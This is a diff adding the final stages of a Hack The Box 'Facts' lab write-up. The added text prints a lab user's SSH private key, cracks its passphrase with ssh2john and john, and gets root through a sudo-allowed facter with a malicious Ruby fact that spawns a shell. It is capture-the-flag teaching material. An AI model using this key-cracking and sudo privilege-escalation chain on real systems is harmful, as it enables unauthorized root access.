@@ -1,6 +1,6 @@
 ---
 title: "Facts Writeup"
-permalink: /Facts/
+permalink: /season_10/facts.html
 box:
   machine_name: "Facts"
   release: "31 Jan, 2026"
@@ -292,4 +292,139 @@ Within the contents of the `etc/passwd` file, we see two users that can log in: 
 Looking for any low hanging fruits, I check to see if I can access one of these user's home directory. Looking to see if we can access the user.txt file, we see that we can read `william's` user flag. Telling us that this web server is either being ran by the `william` user, or this user has misconfigured permissions.
 <img width="1598" height="703" alt="image" src="https://github.com/user-attachments/assets/166e661b-1655-4e7f-9890-c28439786dc6" />
 
+Knowing we can look through user information, I tried to see if this user has any accessible id_rsa files, but failing to find one for the `william` user I tried to look for it elsewhere.
+
+In the /etc/passwd file, we see another use by the name of `trivia`. The usual `id_rsa` file did not exist, but I wanted to enumerate through all the possible id_rsa files. Looking online I found this `id_ed25515` gave me an ssh private key.
+<img width="1252" height="684" alt="image" src="https://github.com/user-attachments/assets/bdeeb448-7567-4f2f-bba9-d730f25aac61" />
+###### HTTP Response
+```
+HTTP/1.1 200 OK
+
+Server: nginx/1.26.3 (Ubuntu)
+
+Date: Mon, 02 Feb 2026 22:45:32 GMT
+
+Content-Type: application/octet-stream
+
+Content-Length: 464
+
+Connection: keep-alive
+
+x-frame-options: SAMEORIGIN
+
+x-xss-protection: 0
+
+x-content-type-options: nosniff
+
+x-permitted-cross-domain-policies: none
+
+referrer-policy: strict-origin-when-cross-origin
+
+content-disposition: inline; filename="id_ed25519"; filename*=UTF-8''id_ed25519
+
+content-transfer-encoding: binary
+
+cache-control: no-cache
+
+x-request-id: 332de273-6e51-40e0-ad42-acdaa28886d1
+
+x-runtime: 0.028576
+
+
+
+-----BEGIN OPENSSH PRIVATE KEY-----
+b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jdHIAAAAGYmNyeXB0AAAAGAAAABByY61aQV
+OiDrl0uvAcbWplAAAAGAAAAAEAAAAzAAAAC3NzaC1lZDI1NTE5AAAAIKlsZXcIVHrUTWQO
+KjIZZAAJ+MFWfy8WgDWc6t/CH6ltAAAAoAU8O7HA0EH0pgh8yHtMmvA1TBauunRHio2Z69
+Tawm/N9CmXAv+zBVBuh+EOzBYMcoaj2ugUVdkj1ybfnkNy91GyMGY6DVGrKZbygrjWsalE
+BSmWFUObb7LxrhK4JOgnij1ZIgJH8ZfK/81nkVw/kqRTMio9WOnKv4kZBHMgvKNUXseCff
+GhOBhEgtxu24ks+m8Jv6ofbrWZPGKwXEq0I9k=
+-----END OPENSSH PRIVATE KEY-----
+```
+
+Obtaining the private key, we change the permissions and attempt to log in. However, when I try to do this, I am asked for the passphrase for this key.
+
+```
+┌──(kali㉿kali)-[~/HTB_Labs/season_10/facts]
+└─$ chmod 600 trivia_id.rsa           
+                                                                                                                                                                                                                                                                                      
+┌──(kali㉿kali)-[~/HTB_Labs/season_10/facts]
+└─$ ssh -i trivia_id.rsa trivia@10.129.226.66
+Enter passphrase for key 'trivia_id.rsa':
+```
+
+Using the `ssh2john` tool we try and obtain a hash from this key and we do get one
+```
+┌──(kali㉿kali)-[~/HTB_Labs/season_10/facts]
+└─$ ssh2john trivia_id.rsa 
+trivia_id.rsa:$sshng$6$16$7263ad5a4153a20eb974baf01c6d6a65$290$6f70656e7373682d6b65792d7631000000000a6165733235362d6374720000000662637279707400000018000000107263ad5a4153a20eb974baf01c6d6a650000001800000001000000330000000b7373682d6564323535313900000020a96c657708547ad44d640e2a3219640009f8c1567f2f1680359ceadfc21fa96d000000a0053c3bb1c0d041f4a6087cc87b4c9af0354c16aeba74478a8d99ebd4dac26fcdf4299702ffb305506e87e10ecc160c7286a3dae81455d923d726df9e4372f751b230663a0d51ab2996f282b8d6b1a94405299615439b6fb2f1ae12b824e8278a3d59220247f197caffcd67915c3f92a453322a3d58e9cabf8919047320bca3545ec7827df1a138184482dc6edb892cfa6f09bfaa1f6eb5993c62b05c4ab423d9$24$130
+```
+
+Using `john` to crack this hash we get a hit for `dragonballz`
+```
+┌──(kali㉿kali)-[~/HTB_Labs/season_10/facts]
+└─$ john --wordlist=/usr/share/wordlists/rockyou.txt trivia_id_rsa.hash 
+Using default input encoding: UTF-8
+Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
+Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 2 for all loaded hashes
+Cost 2 (iteration count) is 24 for all loaded hashes
+Will run 8 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+dragonballz      (trivia_id.rsa)     
+1g 0:00:00:47 DONE (2026-02-02 17:47) 0.02117g/s 67.76p/s 67.76c/s 67.76C/s billy1..imissu
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed.
+```
+
+When nagivating to the `home` directory, I see that the only user is `william`. However, this user has universal read permissions, so even as the `trivia` user we can read and obtain the user flag in `william's` directory
+```
+trivia@facts:/home/william$ ls -la
+total 24
+drwxr-xr-x 2 william william 4096 Jan 26 11:40 .
+drwxr-xr-x 4 root    root    4096 Jan  8 17:53 ..
+lrwxrwxrwx 1 root    root       9 Jan 26 11:40 .bash_history -> /dev/null
+-rw-r--r-- 1 william william  220 Aug 20  2024 .bash_logout
+-rw-r--r-- 1 william william 3771 Aug 20  2024 .bashrc
+-rw-r--r-- 1 william william  807 Aug 20  2024 .profile
+-rw-r--r-- 1 root    william   33 Feb  2 21:23 user.txt
+```
+
+Checking sudo permissions for my user I see that we can use `facter`, which is a cross-platform command-line and Ruby-based system profiling and inventory tool built for Puppet.
+```
+trivia  william
+trivia@facts:/home$ sudo -l
+Matching Defaults entries for trivia on facts:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
+
+User trivia may run the following commands on facts:
+    (ALL) NOPASSWD: /usr/bin/facter
+```
+
+Looking up `facter` in GTFOBins explains methods to get execution via root. The method you see below shows the PoC of using a malicious ruby file with the combination of setting a custom directory to elevate privielges.
+<img width="1054" height="589" alt="image" src="https://github.com/user-attachments/assets/3ec867ac-50f1-429d-b7a6-5a7bdb010983" />
+
+###### Creation of malicious ruby file
+```
+┌──(kali㉿kali)-[~/HTB_Labs/season_10/facts]
+└─$ cat ruby_script.rb 
+Facter.add(:exploit) do
+        setcode do 
+                system("/bin/sh")
+        end
+end
+```
+
+following the steps in the image we are able to elevate our privileges and get root.
+```
+┌──(kali㉿kali)-[~/HTB_Labs/season_10/facts]
+└─$ scp -i trivia_id.rsa ruby_script.rb trivia@10.129.226.66:/home/trivia 
+Enter passphrase for key 'trivia_id.rsa': 
+ruby_script.rb 
+```
+
+```
+trivia@facts:~$ sudo facter --custom-dir=/home/trivia
+# whoami
+root
+```
 
